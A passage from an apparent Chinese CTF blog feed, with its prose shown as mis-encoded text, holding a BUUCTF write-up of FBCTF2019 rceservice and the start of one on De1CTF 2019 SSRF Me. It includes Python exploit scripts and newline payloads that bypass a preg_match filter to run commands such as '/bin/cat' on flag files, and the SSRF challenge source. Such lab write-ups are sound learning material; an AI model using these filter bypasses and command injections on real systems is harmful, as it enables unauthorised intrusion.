class="hljs-comment">//^å¼€å¤´$ç»“å°¾,.*è¡¨ç¤ºåŒ¹é…ä»»æ„æ•°é‡çš„ä»»æ„å­—ç¬¦(é™¤æ¢è¡Œå¤–)</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>Enter command as JSON</code>ï¼š<code>&#123;&quot;cmd&quot;%3A&quot;ls&quot;&#125;</code>:</p><p><img src="/img/rceservice2.png" alt="rceservice2"></p><p>é¦–å…ˆæ˜¯<code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>è¿™ä¸œè¥¿ï¼Œå°†ç¯å¢ƒå˜é‡ <code>PATH</code> çš„å€¼è®¾ç½®ä¸º <code>/home/rceservice/jail</code>ã€‚åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œ<code>PATH</code> ç¯å¢ƒå˜é‡é€šå¸¸ç”¨äºæŒ‡å®šå¯æ‰§è¡Œç¨‹åºçš„æœç´¢è·¯å¾„ã€‚é€šè¿‡å°† <code>PATH</code> è®¾ç½®ä¸º <code>/home/rceservice/jail</code>ï¼Œå¯ä»¥æŒ‡å®šç³»ç»Ÿåœ¨æ‰§è¡Œå‘½ä»¤æ—¶åªåœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p><code>putenv ç›¸å½“äºä¸€ä¸ªç®€é™‹çš„æ²™ç›’, è®© shell é»˜è®¤ä» /home/rceservice/jailä¸‹å¯»æ‰¾å‘½ä»¤, åé¢çœ‹çš„æ—¶å€™å‘ç°è¿™ä¸ªç›®å½•ä¸‹åªæœ‰ä¸€ä¸ª ls, ä½†å…¶å®ä½¿ç”¨ç»å¯¹è·¯å¾„æ‰§è¡Œå‘½ä»¤ (/bin/cat) å°±èƒ½å¤Ÿç»•è¿‡é™åˆ¶äº†  //å‚è€ƒï¼šhttps://exp10it.cn/2022/09/buuctf-web-writeup-5/#fbctf2019rceservice</code></p><p>ç»•è¿‡çš„è¯æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯æ˜¯å›æº¯ç»•è¿‡ï¼Œç¬¬äºŒç§å°±æ˜¯<code>%0A</code>æ¢è¡Œç»•è¿‡ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=1#reply-list</code></p><p><code>https://www.cnblogs.com/yjken/articles/3922339.html</code></p><p>å¤§è‡´æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ è¶…çº§é•¿çš„å­—ç¬¦ä¸²è®©<code>preg_match</code>æ‰§è¡Œå¤±è´¥è¿”å›<code>False</code>ã€‚è¿™æ ·å¦‚æœæœªå¯¹ç»“æœè¿›è¡Œå¼ºç­‰äºåˆ¤æ–­<code>===</code>å°±å¯ä»¥å®ç°ç»•è¿‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://d74b595f-f641-43c5-87fb-36ddfabc88f0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;ls /home/&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#lsæ˜¯å¯ä»¥ç›´æ¥ç”¨çš„</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br><span class="hljs-comment">#æ³¨æ„è¿™é‡Œè¦ç”¨POSTï¼Œå› ä¸ºGETå¤´ä¸èƒ½å¤ªå¤§å¦åˆ™ä¼šè¿”å›TooLargeRequest</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice3.png" alt="rceservice3"></p><p>å¹¶æ²¡æœ‰<code>flag</code>ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥è°ƒç”¨<code>find</code>å‘½ä»¤æŸ¥æ‰¾<code>flag</code>æ‰€åœ¨ä½ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag*&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#æ³¨æ„è¿™é‡Œçš„find</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice4.png" alt="rceservice4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#lsæ˜¯å¯ä»¥ç›´æ¥ç”¨çš„</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice5.png" alt="rceservice5"></p><p><code>flag&#123;81327f89-050f-46f1-ae16-177e1da4ac08&#125;</code></p><p>æ¢è¡Œç»•è¿‡ä¸»è¦å°±æ˜¯<code>.</code>è¿™ä¸ªä¸œè¥¿ä¸ä¼šå»åŒ¹é…æ¢è¡Œç¬¦ï¼Œä¸€å¼€å§‹æƒ³çš„æ˜¯æ„é€ çš„<code>payload</code>å¿…é¡»ç¬¦åˆ<code>JSON</code>è¿™ä¸œè¥¿çš„æ ¼å¼ï¼Œæƒ³äº†æŒºä¹…ä¸çŸ¥é“è¯¥æŠŠæ¢è¡Œç¬¦æ”¾å“ªã€‚</p><p>æœ€å¼€å§‹æ²¡çœ‹æ‡‚å¸ˆå‚…ä»¬çš„<code>wp</code>æ€ä¹ˆå†™çš„ï¼Œæƒ³äº†ä¸€ä¸‹è¿™ä¸œè¥¿å…¶å®å°±å¯ä»¥çœ‹æˆï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>%<span class="hljs-number">0</span>A<span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%<span class="hljs-number">0</span>A<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice6.png" alt="rceservice6"></p><p>è¿˜æœ‰å…¶å®ƒä¸¤ç§ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%0A%0A&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;%0A%0A<span class="hljs-string">`</span><br><span class="hljs-string"></span><br><span class="hljs-string">`</span>&#123;%0A<span class="hljs-string">&quot;cmd&quot;</span>:%0A<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<code>https://www.cnblogs.com/20175211lyz/p/12198258.html</code></p><p><code>https://www.cnblogs.com/Article-kelp/p/16046129.html</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuctfåšé¢˜è®°å½•_3</title>
    <link href="/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/"/>
    <url>/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•ã€‚</p><span id="more"></span><hr><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><code>Hint:flag is in ./flag.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># Set default encoding to latin1</span><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>) <span class="hljs-comment">#ç”Ÿæˆä¸€ä¸ª16å­—èŠ‚çš„éšæœºå¯†é’¥</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<span class="hljs-comment">#æ¥å—å››ä¸ªå‚æ•°</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip) <span class="hljs-comment">#åˆ©ç”¨md5ä¸ºipåŠ å¯†ç„¶åèµ‹å€¼ç»™sandboxå±æ€§</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(self.sandbox):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<span class="hljs-comment"># åˆ›å»ºç©ºå­—å…¸</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>        <span class="hljs-keyword">if</span> self.checkSign(): <span class="hljs-comment">#scan å’Œ read</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%sæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå°†è¢«self.sandboxçš„å€¼æ›¿æ¢</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#è·å–HTTPè¯·æ±‚ä¸­åä¸º&quot;param&quot;çš„å‚æ•°çš„å€¼,å¦‚æœæ‰¾ä¸åˆ°å°±è¿”å›ç©ºå­—ç¬¦ä¸²</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#åé¢é‚£ä¸ª&quot;&quot;æ„æ€æ˜¯è¦æ˜¯æ²¡å€¼å°±èµ‹ç©º</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> waf(param):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>] <span class="hljs-comment">## æ‰“å¼€æŒ‡å®šURLå¹¶è¯»å–å‰50ä¸ªå­—ç¬¦çš„å†…å®¹ã€‚ä¸è¿‡æ³¨æ„è¿™ä¸œè¥¿å¹¶æ²¡æœ‰è¾“å‡ºã€‚</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest() <span class="hljs-comment">#è®¡ç®—å“ˆå¸Œå¹¶è½¬æ¢æˆ16è¿›åˆ¶</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#å…ˆå»é¦–ä½ç©ºæ ¼å†è½¬æ¢æˆå°å†™</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#å¦‚æœå˜é‡checkä»¥è¿™ä¸¤ä¸ªå¼€å¤´</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br><br><br><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜åˆšæ‹¿åˆ°çš„æ—¶å€™äººæ™•äº†ã€‚ã€‚ä¸çŸ¥æ€ä¹ˆä¸‹æ‰‹ï¼Œè·Ÿç€è¿™ä½å¸ˆå‚…çš„æ€è·¯åšäº†ä¸€ä¸‹ï¼š<code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><p>ä¸€å…±ä¸‰ä¸ªè·¯ç”±ï¼š<code>/</code>,<code>/De1ta</code>,<code>/geneSign</code>ï¼Œå…ˆçœ‹æ¥å—ä¸€å †å‚æ•°çš„<code>/De1ta</code>è·¯ç”±éƒ½æ‹¿å‚æ•°å¹²äº†å•¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>)) <span class="hljs-comment">#åˆ©ç”¨cookieä¼ actionçš„å€¼</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#getä¼ paramï¼Œè¦æ˜¯æ²¡æœ‰ç›´æ¥èµ‹å€¼ä¸ºç©º</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>)) <span class="hljs-comment">#åˆ©ç”¨cookieä¼ signçš„å€¼</span><br></code></pre></td></tr></table></figure><p>æ¥å—åˆ°çš„<code>param</code>å¸¦å…¥åˆ°<code>waf</code>å‡½æ•°é‡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> waf(param):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br></code></pre></td></tr></table></figure><p>çœ‹çœ‹<code>waf</code>å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#å…ˆå»é¦–ä½ç©ºæ ¼å†è½¬æ¢æˆå°å†™</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#å¦‚æœå˜é‡checkä»¥è¿™ä¸¤ä¸ªå¼€å¤´</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ„é€ ä¸€ä¸ª<code>Task</code>ç±»å¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">task = Task(action, param, sign, ip) <span class="hljs-comment">#æ³¨æ„åœ¨pythonä¸­å®ä¾‹åŒ–ä¸€ä¸ªç±»ä¸éœ€è¦ new,ä½†javaå’Œphpéœ€è¦</span><br><span class="hljs-keyword">return</span> json.dumps(task.Exec()) <span class="hljs-comment">#å°†task.Exec()çš„è¿”å›å€¼è½¬æ¢ä¸ºJSONæ ¼å¼çš„å­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p>çœ‹ä¸‹<code>Exec</code>è¿™ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>      result = &#123;&#125;<span class="hljs-comment"># åˆ›å»ºç©ºå­—å…¸</span><br>      result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>      <span class="hljs-keyword">if</span> self.checkSign(): <br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%sæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå°†è¢«self.sandboxçš„å€¼æ›¿æ¢</span><br>              resp = scan(self.param) <span class="hljs-comment">#æ³¨æ„è¿™ä¸ªå‡½æ•°ï¼Œæç¤ºflag in ./flag.txtï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡scanå»è¯»è¯¥æ–‡ä»¶å‰50ä¸ªå­—ç¬¦ï¼Œå¯¹äºflagæ¥è¯´è‚¯å®šå¤Ÿç”¨äº†ï¼Œä½†ä»…æœ‰scanå¹¶ä¸èƒ½æŠŠç»“æœè¾“å‡º)</span><br>              <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                  result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>              <span class="hljs-keyword">else</span>:<br>                  <span class="hljs-built_in">print</span> resp<br>                  tmpfile.write(resp)<br>                  tmpfile.close()<br>                  result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action: <span class="hljs-comment">#scanå’Œreadç»„åˆä½¿ç”¨ï¼Œä¸€å†™ä¸€è¯»</span><br>              f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>          <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action 